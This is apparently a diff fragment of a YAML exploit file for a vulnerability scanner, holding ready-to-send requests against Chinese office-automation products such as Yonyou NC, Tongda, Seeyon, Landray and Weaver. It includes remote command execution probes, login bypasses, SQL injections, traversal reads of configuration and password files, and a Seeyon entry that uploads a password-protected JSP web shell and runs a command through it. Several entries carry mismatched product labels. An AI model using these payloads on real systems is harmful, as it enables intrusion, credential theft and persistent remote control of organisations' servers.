+        matchers: "containsFunc(r\\.Text, \"jdbc\") && equalsFunc(r\\.StatusCode, 200)"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: false
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+
+  - id: "用友 NC bsh.servlet.BshServlet 远程命令执行漏洞"
+    info:
+      name: "用友 NC bsh.servlet.BshServlet 远程命令执行漏洞"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"用友\""
+    rules:
+      rule0:
+        requests:
+          method: "POST"
+          path: "/servlet/~ic/bsh.servlet.BshServlet"
+          allow_redirects: true
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: "bsh.script=print%28%22202cb962ac59075b964b07152d234b70%21%22%29%3B%0D%0A"
+        matchers: "containsFunc(r\\.Text, \"202cb962ac59075b964b07152d234b70\") && equalsFunc(r\\.StatusCode, 200)"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: false
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+
+  - id: "通达im任意文件上传漏洞"
+    info:
+      name: "通达im任意文件上传漏洞"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"通达OA\""
+    rules:
+      rule0:
+        requests:
+          method: "POST"
+          path: "/ispirit/im/upload.php"
+          allow_redirects: true
+          headers:
+            content-type: "multipart/form-data; boundary=---------------------------27723940316706158781839860668"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: "\
+              Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n\
+              Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\r\n\
+              Accept-Encoding: gzip, deflate\r\n\
+              X-Forwarded-For: 127.0.0.1\r\n\
+              Connection: close\r\n
+              Upgrade-Insecure-Requests: 1\r\n
+              Content-Type: multipart/form-data; boundary=---------------------------27723940316706158781839860668\r\n
+              \r\n\
+              -----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"f.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n202cb962ac59075b964b07152d234b70\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"P\"\r\n\r\n1\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"DEST_UID\"\r\n\r\n1222222\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"UPLOAD_MODE\"\r\n\r\n1\r\n-----------------------------27723940316706158781839860668--\r\n
+              "
+        matchers: "containsFunc(r\\.Text, \"+OK [vm]\") && containsFunc(r\\.Text, \"jpg\")"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: false
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+
+  - id: "logincheck_code.php存在通达任意用户登录漏洞"
+    info:
+      name: "logincheck_code.php存在通达任意用户登录漏洞"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"通达OA\""
+    rules:
+      rule0:
+        requests:
+          method: "POST"
+          path: "/logincheck_code.php"
+          allow_redirects: true
+          headers:
+            content-type: "multipart/form-data; boundary=---------------------------27723940316706158781839860668"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: "{\"UID\":\"1\"}"
+        matchers: "Set-Cookie"
+      rule1:
+        requests:
+          method: "GET"
+          path: "/general/index.php"
+          allow_redirects: false
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"cur_login_user_id=admin\")"
+
+  - id: "汉得SRM tomcat.jsp 登陆绕过"
+    info:
+      name: "汉得SRM tomcat.jsp 登陆绕过漏洞"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"通达OA\""
+    rules:
+      rule0:
+        requests:
+          method: "GET"
+          path: "/tomcat.jsp?dataName=role_id&dataValue=1/tomcat.jsp?dataName=role_id&dataValue=1"
+          allow_redirects: true
+          headers:
+            content-type: "multipart/form-data; boundary=---------------------------27723940316706158781839860668"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "Set-Cookie"
+      rule1:
+        requests:
+          method: "GET"
+          path: "/tomcat.jsp?dataName=user_id&dataValue=1"
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"user_id\") && containsFunc(r\\.Text, \"role_id\")"
+
+  - id: "致远OA webmail.do任意文件下载"
+    info:
+      name: "致远OA webmail.do任意文件下载漏洞"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"通达OA\""
+    rules:
+      rule0:
+        requests:
+          method: "GET"
+          path: "/seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties"
+          allow_redirects: true
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"workflow\") && equalsFunc(r\\.StatusCode, 200)"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+
+  - id: "致远OA v8文件上传漏洞"
+    info:
+      name: "致远OA v8文件上传漏洞"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"通达OA\""
+    rules:
+      rule0:
+        requests:
+          method: "GET"
+          path: "/seeyon/wpsAssistServlet"
+          allow_redirects: true
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"flag is empty\") && equalsFunc(r\\.StatusCode, 200)"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+
+  - id: "致远OA A6 test.jsp SQL注入漏洞"
+    info:
+      name: "致远OA A6 test.jsp SQL注入漏洞"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"通达OA\""
+    rules:
+      rule0:
+        requests:
+          method: "GET"
+          path: "/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5(123))"
+          allow_redirects: true
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"202cb962ac59075b964b07152d234b70\") && equalsFunc(r\\.StatusCode, 200)"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+
+  - id: "致远OA getSessionList.jsp Session泄漏漏洞"
+    info:
+      name: "致远OA getSessionList.jsp Session泄漏漏洞"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"通达OA\""
+    rules:
+      rule0:
+        requests:
+          method: "GET"
+          path: "/yyoa/ext/https/getSessionList.jsp?cmd=getAll"
+          allow_redirects: true
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"SessionList\") && containsFunc(r\\.Text, \"seesionID\") && equalsFunc(r\\.StatusCode, 200)"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+
+  - id: "通达htmlofficeservlet命令执行漏洞"
+    info:
+      name: "通达htmlofficeservlet命令执行漏洞"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"通达OA\""
+    rules:
+      rule0:
+        requests:
+          method: "POST"
+          path: "/seeyon/htmlofficeservlet"
+          allow_redirects: true
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: "\
+                Cache-Control: max-age=0\r\n\
+                Content-Type: application/x-www-form-urlencoded\r\n\
+                User-Agent: Mozilla/5.0(Windows NT 10.0;Win64;x64) AppleWebKit/537.36(KHTML, likeGecko) Chrome/92.0.4515.159 Safari/537.36\r\n\
+                Accept-Encoding: gzip, deflate\r\n\
+                Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n
+                Connection: close\r\n
+                \r\n\          
+                DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV\r\n\
+                OPTION=S3WYOSWLBSGr
+                currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\n\
+                CREATEDATE=wUghPB3szB3Xwg66\r\n\
+                RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\n\
+                originalFileId=wV66\r\n\
+                originalCreateDate=wUghPB3szB3Xwg66\r\n\
+                FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6\r\n\
+                needReadFile=yRWZdAS6\r\n\
+                originalCreateDate=wLSGP4oEzLKAz4=iz=66\r\n\
+                <%@ page language=\"java\" import=\"java.util.*,java.io.*\" pageEncoding=\"UTF-8\"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+\"\\n\");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if(\"asasd3344\".equals(request.getParameter(\"pwd\"))&&!\"\".equals(request.getParameter(\"cmd\"))){out.println(\"<pre>\"+excuteCmd(request.getParameter(\"cmd\")) + \"</pre>\");}else{out.println(\":-)\");}%>6e4f045d4b8506bf492ada7e3390d7ce\r\n
+                "
+        matchers: ""
+      rule1:
+        requests:
+          method: "GET"
+          path: "/seeyon/test123456.jsp?pwd=asasd3344&cmd=ipconfig"
+          allow_redirects: false
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"Windows IP\")"
+
+  - id: "致远OA A8 状态监控页面信息泄露"
+    info:
+      name: "致远OA A8 状态监控页面信息泄露"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"通达OA\""
+    rules:
+      rule0:
+        requests:
+          method: "GET"
+          path: "/seeyon/management/status.jsp"
+          allow_redirects: false
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"password\") && equalsFunc(r\\.StatusCode, 200)"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+
+  - id: "致远m1 server命令执行漏洞"
+    info:
+      name: "致远m1 server命令执行漏洞(可能)"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"通达OA\""
+    rules:
+      rule0:
+        requests:
+          method: "GET"
+          path: "/esn_mobile_pns/service/userTokenService"
+          allow_redirects: true
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "equalsFunc(r\\.StatusCode, 500)"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+
+  - id: "致远登录绕过"
+    info:
+      name: "致远登录绕过漏洞"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"通达OA\""
+    rules:
+      rule0:
+        requests:
+          method: "POST"
+          path: "/seeyon/thirdpartyController.do"
+          allow_redirects: true
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1"
+        matchers: "containsFunc(r\\.Text, \"a8genius.do\")"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+
+  - id: "致远OA A6 initDataAssess.jsp 用户敏感信息泄露"
+    info:
+      name: "致远OA A6 initDataAssess.jsp 用户敏感信息泄露"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"通达OA\""
+    rules:
+      rule0:
+        requests:
+          method: "GET"
+          path: "/yyoa/assess/js/initDataAssess.jsp"
+          allow_redirects: true
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"personList\") && containsFunc(r\\.Text, \"personHash\") && equalsFunc(r\\.StatusCode, 200)"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+
+  - id: "致远OA ajax.do文件上传"
+    info:
+      name: "致远OA ajax.do文件上传(可能)"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"通达OA\""
+    rules:
+      rule0:
+        requests:
+          method: "GET"
+          path: "/seeyon/autoinstall.do.css/..;/ajax.do"
+          allow_redirects: true
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"java.lang.NullPointerException:null\") && equalsFunc(r\\.StatusCode, 200)"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+
+  - id: "启莱OA treelist.aspx SQL注入漏洞"
+    info:
+      name: "启莱OA treelist.aspx SQL注入漏洞"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"通达OA\""
+    rules:
+      rule0:
+        requests:
+          method: "GET"
+          path: "/client/treelist.aspx?user=%27%20and%20(select%20@@version)>0--&pwd=1"
+          allow_redirects: true
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"Microsoft SQL Server\") && equalsFunc(r\\.StatusCode, 500)"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+
+  - id: "启莱OA messageurl.aspx SQL注入漏洞"
+    info:
+      name: "启莱OA messageurl.aspx SQL注入漏洞"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"通达OA\""
+    rules:
+      rule0:
+        requests:
+          method: "GET"
+          path: "/client/messageurl.aspx?user=%27%20and%20(select%20@@version)>0--&pwd=1"
+          allow_redirects: true
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"Microsoft SQL Server\") && equalsFunc(r\\.StatusCode, 500)"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+
+  - id: "启莱OA CloseMsg.aspx SQL注入漏洞"
+    info:
+      name: "启莱OA CloseMsg.aspx SQL注入漏洞"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"通达OA\""
+    rules:
+      rule0:
+        requests:
+          method: "GET"
+          path: "/client/CloseMsg.aspx?user=%27%20and%20(select%20@@version)>0--&pwd=1"
+          allow_redirects: true
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"Microsoft SQL Server\") && equalsFunc(r\\.StatusCode, 500)"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+
+  - id: "启莱OA checkuser.aspx SQL注入漏洞"
+    info:
+      name: "启莱OA checkuser.aspx SQL注入漏洞"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"通达OA\""
+    rules:
+      rule0:
+        requests:
+          method: "GET"
+          path: "/client/checkuser.aspx?user=%27and%20@@version>0--&pwd=1"
+          allow_redirects: true
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"Microsoft SQL Server\") && equalsFunc(r\\.StatusCode, 500)"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+
+  - id: "金和OA C6 download.jsp 任意文件读取漏洞"
+    info:
+      name: "金和OA C6 download.jsp 任意文件读取漏洞"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"金和OA\""
+    rules:
+      rule0:
+        requests:
+          method: "GET"
+          path: "/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config"
+          allow_redirects: true
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"configuration\") && containsFunc(r\\.Text, \"section\") && equalsFunc(r\\.StatusCode, 200)"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+
+  - id: "蓝凌OA custom.jsp 任意文件读取漏洞"
+    info:
+      name: "蓝凌OA custom.jsp 任意文件读取漏洞"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"蓝凌OA\""
+    rules:
+      rule0:
+        requests:
+          method: "POST"
+          path: "/sys/ui/extend/varkind/custom.jsp"
+          allow_redirects: true
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: "var={\"body\":{\"file\":\"/WEB-INF/KmssConfig/admin.properties\"}}"
+        matchers: "containsFunc(r\\.Text, \"password\") && containsFunc(r\\.Text, \"properties\") && equalsFunc(r\\.StatusCode, 200)"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+
+  - id: "泛微E-Cology WorkflowServiceXml RCE"
+    info:
+      name: "泛微E-Cology WorkflowServiceXml RCE(可能)"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"蓝凌OA\""
+    rules:
+      rule0:
+        requests:
+          method: "GET"
+          path: "/services%20/WorkflowServiceXml"
+          allow_redirects: true
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: "var={\"body\":{\"file\":\"/WEB-INF/KmssConfig/admin.properties\"}}"
+        matchers: "containsFunc(r\\.Text, \"Invalid SOAP request\") && equalsFunc(r\\.StatusCode, 200)"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+
+  - id: "泛微OA LoginSSO.jsp SQL注入漏洞"
+    info:
+      name: "泛微OA LoginSSO.jsp SQL注入漏洞"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"泛微E-Cology\""
+    rules:
+      rule0:
+        requests:
+          method: "GET"
+          path: "/upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager"
+          allow_redirects: true
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"<code>\") && containsFunc(r\\.Text, \"<BODY>\") && equalsFunc(r\\.StatusCode, 200)"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+
+  - id: "泛微OA V8 SQL注入漏洞"
+    info:
+      name: "泛微OA V8 SQL注入漏洞"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"泛微E-Cology\""
+    rules:
+      rule0:
+        requests:
+          method: "GET"
+          path: "/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select+6412121cbb2dc2cb9e460cfee7046be+as+id"
+          allow_redirects: true
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"6412121cbb2dc2cb9e460cfee7046be\") && equalsFunc(r\\.StatusCode, 200)"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+
+  - id: "泛微OA ln.FileDownload任意文件下载漏洞"
+    info:
+      name: "泛微OA ln.FileDownload任意文件下载漏洞"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"泛微\""
+    rules:
+      rule0:
+        requests:
+          method: "GET"
+          path: "/weaver/ln.FileDownload?fpath=conf/resin.conf"
+          allow_redirects: true
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"xmlns:resin\") && equalsFunc(r\\.StatusCode, 200)"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+
+  - id: "ecology注入"
+    info:
+      name: "ecology注入"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"泛微\""
+    rules:
+      rule0:
+        requests:
+          method: "GET"
+          path: "/Api/portal/elementEcodeAddon/getSqlData?sql=select%20@@version"
+          allow_redirects: true
+          headers:
+            content-type: "multipart/form-data; boundary=---------------------------WebKitFormBoundary6XgyjB6SeCArD3Hc"
